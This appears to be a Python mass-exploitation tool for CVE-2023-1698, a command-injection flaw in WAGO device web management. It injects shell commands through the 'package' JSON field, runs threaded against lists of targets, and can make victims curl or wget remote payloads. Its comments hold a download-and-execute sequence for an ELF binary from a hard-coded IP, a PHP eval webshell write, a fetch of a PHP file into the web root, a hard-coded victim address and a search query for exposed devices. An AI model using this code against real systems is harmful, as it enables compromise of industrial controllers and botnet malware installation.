import argparse
import copy
import os
import random
import re
import string
import time

import requests
import concurrent.futures
from user_agent import get_user_agent_pc
# curl http://46.17.42.48:80/armbe.elf -o /tmp/armbe.elf
# cd /tmp
# chmod +x armbe.elf
# ./armbe.elf

headers = None
proxies = None
timeout = None
delay = None
thread = None
output = None
DEFAULT_USER_AGENT = 'Mozilla/5.0.html (Windows NT 6.1; WOW64; rv:34.0.html) Gecko/20100101 Firefox/34.0.html'
DEFAULT_OUTPUT_FILE = "res.txt"
MIN_VARIABLE_NUM = 1
MAX_VARIABLE_NUM = 10
MAX_LENGTH = 10
_result = []
suffix = "elf"
# "web-based management" && country!="CN" && country=="FR"
# proxies = {
#     'http': 'http://127.0.0.1:10809'
# }
#
# headers = {
#     'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36'
# }
#
# attack_url = "/wbm/plugins/wbm-legal-information/platform/pfcXXX/licenses.php"
# # command = {"package":";echo '<?php @eval(cmd);?>' > test_mysqli.php;#"}
# # command = {"package":";ls;#"}
# command = {"package":";ls /tmp/test1.elf;#"}
#
# output = "res/wago1.txt"
#
#
#
# # curl http://46.17.42.48:8000/may.php -o /var/www/wbm/test1.php
# def attack(url, attack_url):
#     try:
#         res = requests.post(url=url + attack_url, json=command, headers=headers, proxies=proxies, timeout=(5, 10),
#                             verify=False)
#         if res.status_code < 400:
#             print(f"""[+]正在尝试攻击{url}...[+]{res.content.decode(res.encoding if res.encoding is not None else "UTF-8")}""")
#             _result.append(f"""[+]正在尝试攻击{url}...[+]{res.content.decode(res.encoding if res.encoding is not None else "UTF-8")}""")
#     except Exception as e:
#         print(f"""[*]正在尝试攻击{url} but {e.args.__str__()}""")
#         return
#
# attack("http://165.228.155.182", attack_url)
# # with open("urls.txt", mode="r") as f:
# #     urls = f.read().split("\n")
# #     with concurrent.futures.ThreadPoolExecutor(max_workers=50) as executor:
# #         for url in urls:
# #             executor.submit(attack, url, attack_url)
#
# with open(output, mode="wb+") as f:
#     f.write("\n".join(_result).encode())


def set_cmd_arg() -> any:
    description = 'WAGO System Remote Code Execution Vulnerability (CVE-2023-1698)'
    parser = argparse.ArgumentParser(description=description, add_help=True)

    targets = parser.add_mutually_exclusive_group(required=True)
    targets.add_argument('-u', '--url', type=str, help='Enter target object')
    targets.add_argument("-f", '--file', type=str, help='Input target object file')

    upload = parser.add_mutually_exclusive_group(required=False)
    upload.add_argument('--remote-file-include', type=str, help='Enter the filepath(it must be On the public network)')
    upload.add_argument('--local-file-include', type=str, help='Enter the filepath(it must be On the local)')
    upload.add_argument('--remote-command', type=str, help='Enter the command you want to execute')

    useragent = parser.add_mutually_exclusive_group(required=False)
    useragent.add_argument('--random-agent', type=bool, default=True, help='Using random user agents')

    parser.add_argument('-d', '--delay', type=int,
                        required=False, help='Set multi threaded access latency (setting range from 0 to 5)')
    parser.add_argument('-t', '--thread', type=int,
                        required=False, help='Set the number of program threads (setting range from 1 to 50)')
    parser.add_argument('--proxy', type=str, required=False, help='Set up the proxy')
    parser.add_argument('--type', type=str, required=False, default="elf", help='Set up the remote upload file type')
    parser.add_argument('-o', "--output", type=str, required=False, help='output filename')

    args = parser.parse_args()
    return args


def parse_cmd_args(args) -> dict:
    o = dict()
    if args.url is None or not args.url:
        o.setdefault('url', {'type': 'file', 'value': args.file})
    else:
        o.setdefault('url', {'type': 'str', 'value': args.url})

    if args.remote_command is not None:
        if not args.remote_command:
            o.setdefault('content', {'type': 'str', 'value': {
                "type": "poc",
                "content": "id"
            }})
        else:
            o.setdefault('content', {'type': 'str', 'value': {
                "type": "poc",
                "content": args.remote_command
            }})
    elif args.local_file_include is not None:
        if not args.local_file_include:
            o.setdefault('content', {'type': 'str', 'value': {
                "type": "poc",
                "content": "id"
            }})
        else:
            code, content = get_data_from_file(args.local_file_include, mode="r")
            if code != 200:
                o.setdefault('content', {'type': 'str', 'value': {
                    "type": "poc",
                    "content": "id"
                }})
            else:
                o.setdefault('content', {'type': 'str', 'value': {
                    "type": "poc",
                    "content": ";".join(content)
                }})
    else:
        if args.remote_file_include is None or not args.remote_file_include:
            o.setdefault('content', {'type': 'str', 'value': {
                "type": "poc",
                "content": "id"
            }})
        else:
            o.setdefault('content', {'type': 'str', 'value': {
                "type": "exp",
                'content': args.remote_file_include
            }})

    options = dict()
    if args.random_agent is not None and args.random_agent:
        user_agent = get_user_agent_pc()
    else:
        user_agent = DEFAULT_USER_AGENT
    options.setdefault('user_agent', user_agent)
    options.setdefault('delay', args.delay if args.delay is not None else 0)
    options.setdefault('thread', args.delay if args.thread is not None else 1)
    options.setdefault('proxy', args.proxy if args.proxy is not None else None)
    options.setdefault('type', args.type if args.proxy is not None else "elf")
    options.setdefault('output', args.output if args.output is not None else DEFAULT_OUTPUT_FILE)
    o.setdefault('options', {"type": "str", "value": options})
    return o


def get_data_brute_params(url_dict: dict) -> dict:
    brute_list = {
        'url': None
    }

    for key, value in url_dict.items():
        _type = value.get("type")
        if _type is None or not _type:
            continue
        if _type == "file":
            _value = value.get("value")
            code, res = get_data_from_file(_value, mode="r")
            if code != 200:
                print(res)
                continue
            if key != 'content':
                brute_list[key] = res
            else:
                brute_list[key] = {'type': 'poc', 'content': res}
        else:
            brute_list[key] = [value.get('value', None), ]
    return brute_list


def get_data_from_file(filename: str, mode: str) -> tuple:
    def check_filename(name: str) -> (int, str or None):
        if not os.path.isabs(name):
            name = os.path.abspath(os.path.join(os.getcwd(), name))
        if not os.path.exists(name):
            return 404, f"[!]{name} does not exist"
        if not os.path.isfile(name):
            return 405, f"[!]{name} is Not a legal document"
        return 200, name

    try:
        code, content = check_filename(filename)
        if code != 200:
            return code, content
        with open(filename, mode=mode) as f:
            content = f.read().split("\n")
        return 200, content
    except Exception as e:
        print(e.args.__str__())
        return 200, f"[!]Unexpected error occurred during file processing while opening {filename}"


def parse_param(o: dict) -> (list, str, str):
    global proxies, headers, timeout, delay, thread, output, suffix

    def check_proxy(content: str) -> (int, str):
        mode = re.compile("^(?P<protocol>(http|https|socks4|socks5>))://([A-Za-z0-9]*:[A-Za-z0-9]*@)?([A-Za-z0-9.\-]+)(:[0-9]+)?(/[A-Za-z0-9./]*)?", re.I)
        groups = mode.search(content)
        if groups is None:
            return 500, "Unreasonable proxy settings"
        try:
            protocol = groups.group("protocol")
            return 200, protocol
        except Exception as e:
            return 404, "Failed to identify the protocol used by the agent"

    brute_list = get_data_brute_params(o)
    urls = brute_list.get('url', None)
    options = brute_list.get('options', None)
    _content = brute_list.get('content')
    _content = _content[0]

    _type = _content.get("type", "poc")
    _payload = _content.get("content", "id")

    if options:
        options = options[0]
    _proxy = options.get('proxy', None)

    if _proxy is None or not _proxy:
        proxies = _proxy
    else:
        code, content = check_proxy(_proxy)
        if code != 200:
            proxies = _proxy
        else:
            proxies = dict()
            proxies.setdefault(content, _proxy)

    headers = dict() if headers is None or not headers else headers
    headers.setdefault("User-Agent", options.get('user_agent', DEFAULT_USER_AGENT))

    output = options.get('output', DEFAULT_OUTPUT_FILE)
    timeout = options.get('time_out', 0)
    delay = options.get('delay', 0)
    thread = options.get('thread', 1)
    suffix = options.get('type', "elf")

    return urls, _payload, _type


def create_random_variable_name(length: int, is_value: bool = False) -> tuple:
    _start = 0 if is_value else 1
    if length < 1 or length > MAX_LENGTH:
        if is_value:
            length = 1
        else:
            length = 2
    letters = string.ascii_letters
    nums_letters = string.ascii_letters + string.digits
    _prefix = ''.join(random.choice(letters) for _ in range(_start))
    _suffix = ''.join(random.choice(nums_letters) for _ in range(length))
    o = _prefix + _suffix
    return o, length


def create_random_variable_length() -> int:
    return random.randint(MIN_VARIABLE_NUM, MAX_VARIABLE_NUM)


def attack(url: str, _headers: dict, _payload: str, _type: str):
    global output, _result

    def check_function(url: str) -> list:
        global suffix
        _res = list()
        curl_name, _ = create_random_variable_name(create_random_variable_length(), is_value=False)
        wget_name, _ = create_random_variable_name(create_random_variable_length(), is_value=False)
        _code = [
            f"""curl {url} -o /tmp/{curl_name}.{suffix}""",
            f"""curl {url} -o ./{curl_name}.{suffix}""",
            f"""wget {url} -O /tmp/{wget_name}.{suffix}""",
            f"""wget {url} -O ./{wget_name}.{suffix}""",
        ]
        for item in _code:
            _res.append({"package": f";{item};#"})
        return _res

    command = list()
    if _type.lower() == "poc":
        command.append({"package": f";{_payload};#"})
    else:
        command = check_function(_payload)
    for runtime in command:
        try:
            res = requests.post(url=url, json=runtime, headers=headers, proxies=proxies, timeout=(5, 10),
                                verify=False)

            if res.status_code < 400:
                print(f"""[+]正在尝试攻击{url}...[+]{res.content.decode(res.encoding if res.encoding is not None else "UTF-8")}""")
                if len(_result) < 50:
                    _result.append(
                        f"""[+]正在尝试攻击{url}...[+]{res.content.decode(res.encoding if res.encoding is not None else "UTF-8")}""")
                else:
                    with open(output, mode="wb+") as f:
                        f.write("\n".join(_result).encode())
                    _result = list()
        except Exception as e:
            print(f"""[*]正在尝试攻击{url} but {e.args.__str__()}""")
            return


def task(urls: list, payload: str, _type: str):
    attack_url = "/wbm/plugins/wbm-legal-information/platform/pfcXXX/licenses.php"
    _headers = copy.deepcopy(headers)

    with concurrent.futures.ThreadPoolExecutor(max_workers=thread) as executor:
        for url in urls:
            executor.submit(attack, url + attack_url, _headers, payload, _type)
            time.sleep(delay if delay is not None else 0)


def main() -> None:
    args = set_cmd_arg()
    obj = parse_cmd_args(args)
    urls, payload, _type = parse_param(obj)
    task(urls, payload, _type)


if __name__ == '__main__':
    main()
